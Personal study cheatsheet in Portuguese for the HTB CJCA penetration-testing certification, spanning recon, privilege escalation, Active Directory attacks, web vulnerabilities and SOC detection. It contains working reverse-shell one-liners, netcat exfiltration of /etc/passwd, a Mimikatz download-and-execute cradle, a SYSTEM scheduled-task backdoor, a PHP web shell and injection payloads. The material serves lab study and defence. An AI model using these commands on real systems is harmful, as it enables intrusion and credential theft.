# HTB CJCA — Cheatsheet (notas pessoais de estudo)

> Notas pessoais de estudo para a certificação HTB CJCA. Sem afiliação com a Hack The Box.
> Sem flags, sem soluções de labs ativos, sem conteúdo verbatim da Academy — só comandos genéricos e resumos próprios.

## 1. Recon / Enumeration

### Nmap

```bash
# Descoberta de hosts (ping scan, sem escanear portas, só vê quem responde)
nmap -sn 10.10.10.0/24

# Scan básico com output para todos formatos (-sC scripts padrão, -sV versão, -oA salva em 3 formatos)
nmap -sC -sV -oA scan <IP>

# Todas as portas TCP rápido (--min-rate acelera, -oA salva)
nmap -p- --min-rate 5000 -oA allports <IP>
nmap -p- -sC -sV <IP> -v --stats-every=5s  # aperta [Espaço] p/ ver progresso

# Scan completo (todas portas + scripts + versão + OS)
nmap -p- -sC -sV -O <IP>

# UDP top 100 (demorado, usa só top ports, precisa sudo)
sudo nmap -sU --top-ports 100 -oA udp <IP>

# Scripts de vulnerabilidade (testa CVEs conhecidas / mostra rootDSE do LDAP / descobre OS via SMB)
nmap --script vuln <IP>
nmap --script ldap-rootdse -p 389 <IP>
nmap --script smb-os-discovery -p 445 <IP>
nmap -p80 -sV --script http-enum,http-wordpress-users,vulners <IP>
sudo nmap -p111,2049 --script nfs* <IP>  # NFS
sudo nmap -p25 --script banner,smtp-commands <IP>  # SMTP (VRFY/STARTTLS)
sudo nmap -p21 --script ftp-anon,ftp-syst <IP>  # FTP

# HTML legível p/ report (-oN normal, -oX xml, -oG grep, -oA todos)
xsltproc scan.xml -o scan.html

# Rede grande rápida (subnet inteira, timeout curto, sem retry)
sudo nmap 10.129.2.0/24 -F --initial-rtt-timeout 50ms --max-rtt-timeout 100ms
sudo nmap 10.129.2.0/24 -F --max-retries 0
sudo nmap 10.129.2.0/24 -F --min-rate 300 -oN tnet
# -T0 paranoico / -T1 sneaky / -T2 polite / -T3 normal / -T4 agressivo / -T5 insano
sudo nmap 10.129.2.0/24 -F -T4

# Firewall: ACK vs SYN (unfiltered = sem firewall, filtered = firewall)
sudo nmap <IP> -p21,22,25 -sA -Pn -n --disable-arp-ping
# Evasão: fragmenta (-f 8B, -ff 16B), porta origem 53, decoys, MTU, IP falso
sudo nmap <IP> -p80 -sS --max-rate 30 -f -D RND:5
sudo nmap <IP> -p80 -sS -g 53 --mtu 24 -D RND:5 -S 10.129.2.200 -e tun0

# Vuln scan rápido (atualiza scripts antes)
sudo nmap --script-updatedb
find /usr/share/nmap/scripts/ -type f -name "ftp*|smb*|http*"
```

### Portas comuns

```text
21   FTP
22   SSH
25   SMTP
53   DNS
80   HTTP
88   Kerberos
110  POP3
139  NetBIOS
389  LDAP
445  SMB
1433 MSSQL
3306 MySQL
3389 RDP
5985 WinRM
8080 HTTP-alt
```

---

## 2. Linux Enumeration

```bash
whoami # usuário atual
id # uid, gid e grupos (se vê adm, docker, sudo)
hostname # nome da máquina
uname -a # kernel + arquitetura (para buscar CVE de kernel)
cat /etc/os-release # distro e versão

# Usuários (quem existe, quem tem shell, quem tem senha)
cat /etc/passwd # lista usuários
cat /etc/shadow # hashes (só root lê)
getent passwd # mesma lista via NSS, pega LDAP também

# Sudo (o que posso rodar como root sem senha, vetor nº1 de privesc)
sudo -l

# Processos (programa rodando como root? credencial em linha de comando?)
ps aux # processos
ps auxww # mesmo com linha completa, sem cortar

# Rede (interfaces, rotas, portas ouvindo = serviço interno?)
ip a # IPs
ip route # rota padrão, rede interna
ss -tulpn # portas TCP/UDP ouvindo + PID

# SUID (binário roda como dono, se dono é root = privesc direto)
find / -perm -4000 -type f 2>/dev/null

# Capabilities (alternativa ao SUID, ex: python com cap_setuid)
getcap -r / 2>/dev/null

# Cron (tarefa agendada rodando como root com script editável = privesc)
cat /etc/crontab
ls -la /etc/cron.*
```

### Arquivos interessantes

```bash
find / -name "*.conf" 2>/dev/null # configs com senha
find / -name "*.bak" 2>/dev/null # backup esquecido com credencial velha
find / -name "id_rsa" 2>/dev/null # chave SSH privada vazada
grep -Rni "password" /var/www 2>/dev/null # senha hardcoded em site
```

---

## 3. Windows Enumeration

```cmd
whoami :: usuário atual
whoami /all :: usuário + grupos + privilégios (vê SeImpersonate, admin)
hostname :: nome da máquina
systeminfo :: versão Windows + patches (para buscar CVE)

ipconfig /all :: IPs, DNS, domínio
route print :: rotas
netstat -ano :: conexões + PID (vê beacon, porta interna)

tasklist :: processos
tasklist /svc :: processo + serviço vinculado

net user :: usuários locais
net localgroup :: grupos locais
net localgroup administrators :: quem é admin local
```

### PowerShell

```powershell
Get-ComputerInfo # versão + build, igual systeminfo mas objeto
Get-LocalUser # usuários locais
Get-LocalGroup # grupos
Get-LocalGroupMember Administrators # quem é admin
Get-Process # processos
Get-Service # serviços (procura path sem aspas, permissão fraca)
Get-NetTCPConnection # conexões, igual netstat
```

### Privilégios

```cmd
whoami /priv :: lista privilégios (SeBackup, SeImpersonate = ouro)
whoami /groups :: grupos + nível de integridade
```

---

## 4. SMB

```bash
# Lista shares sem senha (vê anonymous, backup, config aberta)
smbclient -L //<IP>/ -N

# Conecta sem senha
smbclient //<IP>/<share> -N

# Conecta com usuário de domínio
smbclient //<IP>/<share> -U 'DOMAIN\user'

# Enumeração completa (users, shares, policy, Kerberos)
enum4linux-ng -A <IP>
./enum4linux-ng.py <IP> -A
nxc smb <IP> -u '' -p '' --shares  # null session via NetExec

# RPC (RID brute force p/ enumerar users sem credencial)
rpcclient -U "" -N <IP>
# dentro: srvinfo | enumdomains | querydominfo | netshareenumall | enumdomusers | queryuser 0x1f5
for i in $(seq 500 1100); do rpcclient -N -U "" <IP> -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo ""; done
samrdump.py <IP>
smbmap -H <IP> -u '' -p ''

# Monta share no Kali (vê arquivo como pasta local)
sudo mount -t cifs -o username=user,password=pass //IP/"Company Data" /mnt/local
cat /etc/samba/smb.conf | grep -v "#\|\;"  # no alvo: config aberta?
sudo smbstatus  # no alvo: quem tá conectado

# Nmap rápido para shares e usuários
nmap -p445 --script smb-enum-shares,smb-enum-users <IP>
```

### Comandos do smbclient

```text
ls
cd <directory>
get <file>
put <file>
```

---

## 5. Web Enumeration

```bash
# Tecnologia
whatweb http://<IP>/

# Diretórios (Seclists > dirb)
ffuf -u http://<IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<IP>/FUZZ

# API endpoints (CJCA cobra API)
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -u http://<IP>/api/FUZZ

# Extensões
ffuf -u http://<IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php,.txt,.html,.bak

# Virtual hosts / subdomínios
ffuf -u http://<IP>/ -H "Host: FUZZ.domain.local" -w wordlist.txt
ffuf -u http://<IP>/ -H "Host: FUZZ.domain.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Métodos HTTP (PUT/DELETE habilitado = upload sem auth)
curl -X OPTIONS http://<IP>/ -i
curl -X PUT http://<IP>/api.php/city/london -H 'Content-Type: application/json' -d '{"city_name":"X"}'
```

### Caminhos para verificar

```text
/robots.txt
/sitemap.xml
/.git/
/.env
/config.php
/backup/
/admin/
/login
```

---

## 6. HTTP / Requests

```bash
curl http://<IP>/
curl -I http://<IP>/
curl -v http://<IP>/
```

### POST

```bash
curl -X POST http://<IP>/login \
-d 'username=admin&password=test'
```

### Headers

```bash
curl -H "Authorization: Bearer <TOKEN>" http://<IP>/api
```

---

## 7. FTP / NFS / SMTP

```bash
ftp <IP>
# user: anonymous / pass: anonymous (testa sempre primeiro)
```
### FTP avançado

```bash
nmap -p21 --script ftp-anon,ftp-syst <IP>
nmap -sV -p21 -sC -A <IP>
cat /etc/vsftpd.conf | grep -v "#"; cat /etc/ftpusers  # no alvo: anon_enable anon_upload anon_mkdir_write chroot
wget -m --no-passive ftp://anonymous:anonymous@<IP>  # espelha tudo recursivo
# dentro do ftp: ls -R | get file | put shell.php
openssl s_client -connect <IP>:21 -starttls ftp  # se FTPS, vaza hostname/email interno
```

### NFS (só cai se porta 111/2049 aberta — checa sempre)

```bash
sudo nmap -p111,2049 -sV -sC <IP>
showmount -e <IP>  # lista exports
mkdir target-NFS; sudo mount -t nfs <IP>:/ ./target-NFS/ -o nolock
ls -n ./target-NFS/  # vê UID/GID; se no_root_squash = cria SUID como root p/ privesc
cat /etc/exports  # no alvo: rw/ro + no_root_squash = CRÍTICO
sudo umount ./target-NFS
```

### SMTP (porta 25 — user enum + relay)

```bash
nc -nv <IP> 25  # banner vaza hostname
sudo nmap -p25 --script banner,smtp-commands <IP>  # vê VRFY/STARTTLS/PIPELINING
cat /etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d"  # no alvo
# VRFY manual: VRFY admin / EXPN admins (confirma user válido p/ spray)
```

---

## 8. DNS

```bash
nslookup domain.local # resolve e confirma DC
dig domain.local # registros A
dig @<DNS> domain.local # consulta direto no DC
dig axfr @<DNS> domain.local # zone transfer, se liberar vaza zona inteira
dig ns domain.local @<IP>; dig any domain.local @<IP>
dig CH TXT version.bind <IP>  # versão do BIND
dig axfr internal.domain.local @<IP>  # tenta zona interna também
cat /etc/bind/named.conf.local  # no alvo: allow-transfer any = leak
```

### Enumeração

```bash
dnsenum domain.local
dnsenum --dnsserver <IP> --enum -p 0 -s 0 -o subdomains.txt -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt <domain>
for sub in $(cat /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt); do dig $sub.domain.local @<IP> | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt; done
```

## 8b. OSINT Passivo / Cloud (antes de escanear — não faz barulho)

```bash
# crt.sh = subdomínios via certificado (grátis, passivo)
curl -s "https://crt.sh/?q=%25.domain.htb&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > subdomains.txt
for i in $(cat subdomains.txt); do host $i | grep "has address" | cut -d" " -f1,4; done
shodan host <IP>  # o que o Shodan já viu (porta, CVE, banner)
# GrayHatWarfare: busca S3/Blob/GCP aberto por extensão | Domain.Glass: DNS+cert+WAF
# Google dorks:
# intext:"empresa" inurl:amazonaws.com
# intext:"empresa" inurl:blob.core.windows.net
# site:github.com empresa password | site:linkedin.com empresa devops stack
```

---

## 9. Password Attacks

### John the Ripper

```bash
john hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
```

### Hashcat

```bash
hashcat -m 0 hash.txt rockyou.txt      # MD5
hashcat -m 100 hash.txt rockyou.txt    # SHA1
hashcat -m 1000 hash.txt rockyou.txt   # NTLM
hashcat -m 1800 hash.txt rockyou.txt   # sha512crypt ($6$)
hashcat -m 3200 hash.txt rockyou.txt   # bcrypt ($2a$)
hashcat -m 13100 hash.txt rockyou.txt  # Kerberos 5 TGS-REP (13100)
hashcat -m 7500 hash.txt rockyou.txt   # Kerberos 5 AS-REP (7500)
```

```bash
# Identificar hash antes
hash-identifier
hashid hash.txt
```

### Quebrar NTLM / AS-REP / TGS rápido

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hash.txt
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force
```

### SSH

```bash
hydra -l user -P passwords.txt ssh://<IP>
ssh user@<IP>
ssh -i id_rsa user@<IP>
chmod 600 id_rsa
```

### SMB / spray seguro

```bash
nxc smb <IP> -u user -p 'password' # testa login + lista shares
nxc smb <IP> -u user -H <NTLM_HASH> # pass-the-hash, sem senha clara
# Spray lento respeitando lockout (uma senha em vários users, continua mesmo se um der certo)
nxc smb <IP> -u users.txt -p 'Password123!' --continue-on-success
```

### HTTP POST

```bash
hydra -l admin -P passwords.txt <IP> http-post-form \
"/login:user=^USER^&pass=^PASS^:Invalid"
```

> Em ambientes autorizados, como HTB, use brute force somente quando fizer sentido para o cenário.

---

## 10. Shells

### Listener

```bash
rlwrap nc -lvnp 4444 # escuta reversa (rlwrap dá setas + histórico, -v verbose, -n sem DNS, -p porta)
```

### Linux reverse shell

```bash
bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' # bash conecta de volta no seu nc
```

### Python

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])' # mesma reversa mas via python, útil quando bash bloqueado
```

### Windows / PowerShell

```powershell
# Reverse simples
$client=New-Object System.Net.Sockets.TCPClient('<IP>',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Estabilizar shell Linux

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")' # ganha tab + clear
export TERM=xterm # arruma setas e nano/vim
# Ctrl+Z, depois no local:
stty raw -echo; fg # devolve terminal cru e volta pro shell
```

### Transferência de arquivos

```bash
# Atacante (sobe servidor na pasta atual)
python3 -m http.server 8000
python3 -m http.server 8080
cd /usr/share/windows-resources/binaries/  # nc.exe p/ Windows tá aqui

# Vítima Linux (baixa linpeas para escanear privesc)
wget http://<IP>:8000/linpeas.sh
curl -O http://<IP>:8000/linpeas.sh
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh; bash linpeas.sh -a > linpeas.txt
scp -i id_rsa ./linpeas.sh user@<IP>:/tmp/

# Exfil Linux -> Kali
nc -lvnp 9001 > loot.csv  # no Kali; na vítima: nc <KALI> 9001 < /etc/passwd
sudo impacket-smbserver exfil $(pwd) -smb2support  # na vítima: copy file \\<KALI>\exfil\

# Vítima Windows (baixa exe via certutil + executa script em memória sem tocar disco)
certutil -urlcache -split -f http://<IP>:8000/winPEAS.exe winPEAS.exe
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<IP>:8000/Invoke-Mimikatz.ps1')"
```

### Pivoting (rede interna — CJCA cobra)

```bash
ssh -L 8080:10.10.10.5:80 user@<IP>  # port forward local: acessa rede interna via SSH
ssh -D 1080 user@<IP>  # SOCKS proxy (proxychains no /etc/proxychains4.conf socks5 127.0.0.1 1080)
proxychains nmap -sT -Pn 10.10.10.5  # scan via proxy (sT, sem SYN raw)
# Meterpreter: run autoroute -s 10.10.10.0/24 + background + use auxiliary/server/socks_proxy
```

---

## 11. Metasploit

```bash
msfconsole # abre framework
msfconsole -q # sem banner, mais rápido

search <term> # busca exploit, ex: search eternalblue
search type:exploit platform:windows cve:2021 rank:excellent microsoft
info # detalhes + targets + CVE
show options # vê o que precisa preencher
show targets; show payloads
set RHOSTS <IP> # alvo
set RPORT <PORT> # porta alvo
set LHOST <IP> # seu IP para reversa (setg = global)
set SESSION 1 # p/ módulos post
back # volta
run # executa (exploit também funciona)
sessions # lista sessões
sessions -i 1 # entra na sessão
# background = joga sessão p/ fundo sem matar
ls /usr/share/metasploit-framework/modules # exploits/post/auxiliary na mão
```

### Meterpreter

```text
sysinfo :: info do alvo
getuid :: usuário atual no alvo
pwd :: pasta atual
ls :: lista arquivos
shell :: cai para shell normal
download <file> :: baixa arquivo do alvo para você
upload <file> :: sobe arquivo para o alvo
```

---

## 12. Linux Privilege Escalation

### Checklist

```bash
id # grupos extras = privesc (sudo, docker, lxd)
sudo -l # comandos como root, checa NOPASSWD e GTFO bins
uname -a # kernel para CVE
lsb_release -a; systemd-detect-virt  # distro + VM/docker?

find / -perm -4000 -type f 2>/dev/null # SUID root
getcap -r / 2>/dev/null # capabilities perigosas (ex: python3 cap_setuid -> os.setuid(0))
# /usr/bin/python3.8 -c 'import os;os.setuid(0);os.system("/bin/bash")'

ps aux # processo root com config editável?
ss -tulpn # serviço local só acessível por dentro
systemctl list-timers; crontab -l  # timers systemd + cron user

cat /etc/crontab # cron como root
ls -la /etc/cron.* # script do cron com escrita liberada?
cat /etc/exports  # no_root_squash + NFS = root fácil

env # senha em variável de ambiente
history # senha digitada no terminal
cat ~/.bash_history
stat -c "%a %U %G" <file>  # permissão + dono (writable?)

# GTFO clássico: sudo nano -> Ctrl+R -> Ctrl+X -> reset; sh 1>&0 2>&0
# https://gtfobins.github.io | https://lolbas-project.github.io (Windows)
```

### Procurar especialmente

```text
SUID
sudo misconfiguration
writable scripts
cron jobs
credentials
SSH keys
Linux capabilities
PATH hijacking
services
kernel version
```

---

## 13. Windows Privilege Escalation

```cmd
whoami /priv :: SeImpersonate, SeBackup, SeDebug = caminho para SYSTEM
whoami /groups :: vê admin e integridade
systeminfo :: build para CVE + patch faltando
wmic os list brief :: OS rápido
sc query :: serviços + estado
sc query type= service :: todos serviços
schtasks /query /fo LIST /v :: tarefas agendadas com usuário SYSTEM e bin editável
icacls "C:\Program Files\X" :: permissão fraca? (M)(F) p/ user = hijack
```

### PowerShell

```powershell
Get-Service # path sem aspas + permissão de escrita = hijack
Get-ScheduledTask # tarefa com privilégio alto
Get-ChildItem Env: # senha em variável
Get-CimInstance Win32_OperatingSystem # substituto moderno do wmic (wmic deprecated)
Get-FileHash C:\Installer.exe -Algorithm SHA256 # integridade p/ report
Test-NetConnection -ComputerName srv -Port 443 # testa porta interna
Set-ExecutionPolicy Bypass -Scope Process -Force # libera script na sessão
# Task hijack clássico:
# echo 'C:\Temp\nc.exe <IP> 4444 -e cmd.exe' >> C:\ProgramData\Corp\backupprep.ps1
# schtasks /create /sc ONSTART /tn "Update" /tr "C:\Temp\nc.exe <IP> 4444 -e cmd.exe" /ru SYSTEM
```

### Procurar

```text
Weak service permissions
Unquoted service paths
Writable executables
Scheduled tasks
Stored credentials
Interesting registry keys
AlwaysInstallElevated
SeImpersonatePrivilege
```

---

## 14. Active Directory — Básico

```bash
# DNS (descobre DC e domínio)
nslookup domain.local

# LDAP anônimo (lista users, groups sem senha se mal configurado)
ldapsearch -x -H ldap://<DC> \
-b "DC=domain,DC=local"

# SMB (lista shares com credencial de domínio)
smbclient -L //<DC> -U 'DOMAIN\user'
```

### Windows

```cmd
whoami /domain :: confirma domínio e usuário
net user /domain :: todos users do AD
net group /domain :: todos grupos
net group "Domain Admins" /domain :: quem é DA, alvo final
```

### BloodHound / coleta real

```bash
# Coleta via bloodhound-python (gera json para importar no BloodHound e ver attack paths)
bloodhound-python -d domain.local -u user -p 'pass' -ns <DC_IP> -c all

# NetExec enum rápida
nxc smb <DC_IP> -u user -p 'pass' --users
nxc smb <DC_IP> -u user -p 'pass' --shares
nxc smb <DC_IP> -u user -p 'pass' --groups

# Kerberos: user enum + AS-REP roast
kerbrute userenum -d domain.local --dc <DC_IP> users.txt
impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip <DC_IP>

# TGS / Kerberoast
impacket-GetUserSPNs domain.local/user:'pass' -dc-ip <DC_IP> -request

# SMB relay check / secrets
impacket-secretsdump domain.local/user:'pass'@<IP>
```

### BloodHound / PowerView — conceitos

```text
Users
Groups
Computers
Sessions
ACLs
Domain Admins
Attack paths
```

---

## 15. Web Vulnerabilities

Revise estes conceitos:

```text
SQL Injection
XSS
Command Injection
LFI
RFI
Path Traversal
File Upload
Authentication flaws
IDOR
SSRF
XXE
SSTI
CSRF
```

### SQL Injection — testes iniciais

```text
'
"
' OR '1'='1
```

```bash
# Teste rápido com sqlmap
sqlmap -u "http://<IP>/page.php?id=1" --batch --crawl=2
sqlmap -u "http://<IP>/page.php?id=1" --batch --dbs
sqlmap -r request.txt --batch --dump
```

### LFI

```text
../../../../etc/passwd
```

```bash
# LFI + log poisoning / wrapper
curl "http://<IP>/page.php?file=../../../../etc/passwd"
curl "http://<IP>/page.php?file=php://filter/convert.base64-encode/resource=index"
```

### Path Traversal

```text
../../../../etc/passwd
```

### XSS

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><script>alert(document.cookie)</script>
```

### File Upload — testes

```text
shell.php
shell.phtml
shell.php5
shell.jpg + content-type image/jpeg com código PHP dentro
shell.php%00.jpg (null byte antigo)
```

```bash
# Checar execução
curl http://<IP>/uploads/shell.php?cmd=id
```

### Burp — fluxo mínimo

```text
Proxy ON > intercepta login > Send to Repeater
Testa ' OR 1=1, ../../../etc/passwd, <img onerror>
Send to Intruder > Sniper > wordlist em parâmetro id/filename
Method tamper: GET->POST/PUT/OPTIONS | troca Content-Type json<->xml | dropa cookie/JWT
IDOR: troca /user/701 -> /user/702 | roleid=3 -> roleid=1
```

## 15b. WordPress (cai MUITO no CJCA — checar sempre)

```bash
# Detecta versão (meta generator + ?ver= em css/js + readme)
curl -s http://<IP>/ | grep '<meta name="generator"'
curl -s http://<IP>/readme.html; curl -s http://<IP>/wp-includes/version.php
curl -s http://<IP>/ | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins' | cut -d"'" -f2
curl -s http://<IP>/ | sed 's/href=/\n/g' | grep 'wp-content/themes'
# Plugin existe? 200/301/403 = sim, 404 = não
curl -I http://<IP>/wp-content/plugins/mail-masta
# User enum
curl -s -I http://<IP>/?author=1  # Location: /author/admin/
curl -s http://<IP>/wp-json/wp/v2/users | jq
# xmlrpc brute force (stealth via system.multicall)
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>PASS</value></param></params></methodCall>" http://<IP>/xmlrpc.php
wpscan --url http://<IP> --enumerate --api-token <TOKEN> --plugins-detection aggressive -t 100 --disable-tls-checks --no-banner
wpscan --password-attack xmlrpc -t 20 -U admin -P /usr/share/wordlists/rockyou.txt --url http://<IP>/
# LFI clássico mail-masta + RCE via theme editor 404.php
curl "http://<IP>/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
# RCE: Appearance > Themes > 404.php + <?php system($_GET['cmd']); ?> -> /wp-content/themes/twentyseventeen/404.php?cmd=id
msfconsole -q; search wp_admin; use exploit/unix/webapp/wp_admin_shell_upload
```

## 15c. Vulns que faltavam (IDOR / CMDi / XXE / SSRF)

```text
IDOR: /data/1 -> /data/0 | /user/701/edit -> /user/702 (troca ID e vê dado alheio)
CMDi: 127.0.0.1; whoami | 127.0.0.1 && cat /flag | 127.0.0.1 | id
XXE: <?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///flag.txt">]><data>&xxe;</data>
SSRF: url=http://169.254.169.254/latest/meta-data/ (cloud) | url=http://127.0.0.1:80/admin
File Upload bypass: shell.phtml/.php5 | .jpg com PHP dentro + content-type image/jpeg | PUT method
JWT: troca alg RS256->HS256 | apaga signature | kid=../../dev/null
```

---

## 16. Network Analysis

### tcpdump

```bash
sudo tcpdump -i tun0
sudo tcpdump -i tun0 host <IP>
sudo tcpdump -i tun0 port 80
sudo tcpdump -i tun0 -w capture.pcap
tshark -r capture.pcap
tshark -r capture.pcap -q -z conv,tcp
tshark -r capture.pcap -Y "http contains password"
tshark -r capture.pcap -Y "http.request.method==POST"
tshark -r capture.pcap -Y dns -T fields -e dns.qry.name | sort -u
```

### Wireshark — filtros úteis

```text
ip.addr == 10.10.10.10
tcp.port == 80
http
http.request
http.response.code >= 400
dns
smb
smb2
kerberos
ssh
ftp
tcp contains "password"
tcp.flags.syn == 1
```

### Procurar

```text
Credentials
Cleartext protocols
Suspicious DNS
Beaconing
Port scanning
Unusual connections
Large data transfers
```

---

## 17. Windows Event Logs

```powershell
# Buscar local rápido
Get-WinEvent -LogName Security -MaxEvents 20
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625} -MaxEvents 20
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4688} -MaxEvents 20 | Select-Object TimeCreated, Message
Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -MaxEvents 20
```

```cmd
wevtutil qe Security /c:20 /f:text
wevtutil qe "Microsoft-Windows-Sysmon/Operational" /c:20 /f:text
```

Eventos importantes:

```text
4624  Successful logon (tipo: 2 console, 3 rede, 10 RDP)
4625  Failed logon (brute force: vários 4625 + 1x 4624 = quebrou)
4634  Logoff
4648  Explicit credentials (runas / PtH)
4672  Special privileges assigned (virou admin/SYSTEM)
4688  Process creation (CommandLine mostra o que rodou)
4698  Scheduled task created (persistência)
4720  User account created (backdoor account)
4728  User added to security-enabled global group
4732  User added to local group (net localgroup administrators user /add)
7045  Service installed (persistência via serviço)
4103/4104 PowerShell Module/Script Block Logging (script ofuscado)
1     Sysmon Process Create | 3 Network Connect | 11 FileCreate | 13 Registry | 22 DNS Query
```

### Sysmon rápido (onde o SOC vê o que Event Log não mostra)

```text
1 ProcessCreate: Image + ParentImage + CommandLine + Hashes
3 NetworkConnect: Image + DestinationIp/Port (beacon/C2)
11 FileCreate: TargetFilename (dropper/web shell)
13 RegistryEvent: TargetObject Run key (persistência)
22 DnsQuery: QueryName (DGA/C2)
```
```powershell
Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -MaxEvents 20 | Where {$_.Id -eq 1} | Select TimeCreated,Message
wevtutil el # lista logs | wevtutil gl "Windows PowerShell" # config
wevtutil epl System C:\system_export.evtx # exporta p/ análise
```

### Perguntas para investigação

```text
WHO?
WHEN?
FROM WHERE?
WHAT PROCESS?
WHAT ACCOUNT?
WHAT ACTION?
```

---

## 18. SIEM / Threat Hunting

### KQL Elastic — prioridade CJCA

```kql
event.category:authentication // todo login
event.code:4624 OR event.code:4625 // sucesso OU falha
host.name:"HOSTNAME" AND user.name:"USER" // filtra host + user
process.name:(powershell.exe OR cmd.exe) // execução suspeita
process.command_line:*EncodedCommand* // powershell ofuscado, comum em ataque
source.ip:"10.10.10.10" AND event.outcome:"failure" // brute force de um IP
destination.port:(4444 OR 1337 OR 9001) // porta típica de C2/reversa
// Blue CJCA extra:
event.code:4688 AND process.command_line:*mimikatz* // cred dump
event.code:7045 AND service.name:* // serviço novo (persistência)
event.code:4720 OR event.code:4732 // conta criada / virada admin
winlog.event_data.TargetUserName:*admin* AND event.code:4625 // spray em admin
process.parent.name:winword.exe AND process.name:powershell.exe // macro/phishing
dns.question.name:*// beacon/DGA (com Sysmon 22 ou Packetbeat)
```

### IR Lifecycle (cai na teoria — decora ordem)

```text
Preparation -> Detection & Analysis -> Containment -> Eradication -> Recovery -> Lessons Learned
(NIST SP 800-61 | HTB M17: mesmo fluxo p/ narrativa do report)
MITRE ATT&CK p/ mapear: Initial Access -> Execution -> Persistence -> PrivEsc -> Defense Evasion -> Cred Access -> Discovery -> Lateral -> Collection -> Exfil -> Impact
```

### Splunk SPL — referência

```spl
index=* EventCode=4625 | stats count by src_ip, user | sort -count
index=* EventCode=4624 | stats count by user, src_ip
index=* EventCode=4688 New_Process_Name="*powershell*" | table _time, user, Computer, CommandLine
index=* Sysmon EventCode=1 | table _time, Computer, Image, CommandLine, ParentImage
index=* failed | timechart count by src_ip
```

### Linux logs — onde olhar

```bash
cat /var/log/auth.log | grep -i "failed\|accepted" # login SSH certo e errado
cat /var/log/syslog | grep -i "cron\|ssh" # cron + ssh
journalctl -u ssh --no-pager | tail -n 100 # log do ssh via systemd
last -f /var/log/wtmp # últimos logins válidos
lastb # últimos logins falhos, mostra brute force
cat ~/.bash_history # comandos que o user rodou
```

### Fluxo investigação SOC

```text
1. Confirma alerta, host e conta afetada
2. Monta timeline com timestamps
3. Identifica source, destination, processo, user, resultado auth
4. Pivota IP > hostname > user > processo > cmdline > eventos relacionados
5. Define escopo e persistência
6. Preserva evidência e IoCs
7. Recomenda contenção, erradicação, recuperação e melhoria de detecção
```

### Fluxo antigo

```text
Alert
  ↓
Validate
  ↓
Identify source
  ↓
Identify user/host
  ↓
Build timeline
  ↓
Find related events
  ↓
Determine malicious/benign
  ↓
Collect evidence
  ↓
Document
```

### Procurar

```text
Failed logins
Successful login after failures
New processes
PowerShell execution
Encoded commands
New services
Scheduled tasks
Privilege changes
Suspicious network connections
Persistence
Lateral movement
```

### Template de reporte CJCA

```text
Title:
Severity:
Affected asset:
Description:
Evidence:
Business impact:
Steps to reproduce:
Remediation:
References:
```

Exemplo: Anonymous FTP expõe config interna, permite pegar credencial sem login e alcançar o servidor da aplicação. Remediação: desabilita anonymous e move arquivo sensível para fora do FTP.

---

# 19. Mental Checklist da CJCA

## Enumeration

```text
├── Ports
├── Services
├── Versions
├── Users
├── Shares
├── Web
└── Credentials
```

## Exploitation

```text
├── Known CVEs
├── Misconfigurations
├── Web vulnerabilities
├── Weak credentials
└── Manual exploitation
```

## Post-Exploitation

```text
├── whoami / id
├── Network
├── Processes
├── Credentials
├── Files
├── Privileges
└── Persistence
```

## Privilege Escalation

```text
├── SUID
├── sudo
├── Capabilities
├── Cron
├── Services
├── Scheduled Tasks
├── Weak permissions
└── Tokens / Privileges
```

## Blue Team

```text
├── SIEM
├── Event Logs
├── PCAP
├── Authentication
├── Processes
├── Network connections
└── Timeline
```

## Reporting

```text
├── Finding
├── Evidence
├── Impact
├── Risk
├── Reproduction
└── Remediation
```

---

# 20. Quick Reference — Fluxo de uma Máquina HTB

```text
                    ┌─────────────┐
                    │   TARGET    │
                    └──────┬──────┘
                           │
                           ▼
                    ┌─────────────┐
                    │ ENUMERATION │
                    └──────┬──────┘
                           │
              ┌────────────┼────────────┐
              ▼            ▼            ▼
           Network        Web          SMB
              │            │            │
              └────────────┼────────────┘
                           ▼
                    ┌─────────────┐
                    │  FOOTHOLD   │
                    └──────┬──────┘
                           │
                           ▼
                  ┌─────────────────┐
